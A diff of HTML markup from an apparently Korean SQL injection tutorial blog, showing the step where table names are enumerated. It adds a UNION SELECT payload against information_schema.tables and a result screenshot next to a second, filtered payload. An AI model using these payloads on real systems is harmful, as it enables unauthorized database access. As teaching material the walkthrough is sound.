@@ -96,6 +96,12 @@ segfault_sql 이 DB 이름임을 확인했다.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id="step-5-table-이름-확인"&gt;Step 5. Table 이름 확인
 &lt;/h2&gt;&lt;p&gt;DB 정보를 관리하는 시스템 테이블을 조회한다. MySQL의 경우 &lt;code&gt;information_schema.tables&lt;/code&gt;에 테이블 이름이 들어있다.&lt;/p&gt;
+&lt;p&gt;아래의 코드를 사용하면,&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;UNION&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;4&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;from&lt;/span&gt; information_schema.tables &lt;span style="color:#f92672"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/static/image/sql_injection/union/12image.png"
+loading="lazy"
+alt="Fig 12. information_schema.tables의 결과"
+&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;UNION&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; information_schema.tables
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; table_schema &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;database&lt;/span&gt;() &lt;span style="color:#f92672"&gt;#&lt;/span&gt;
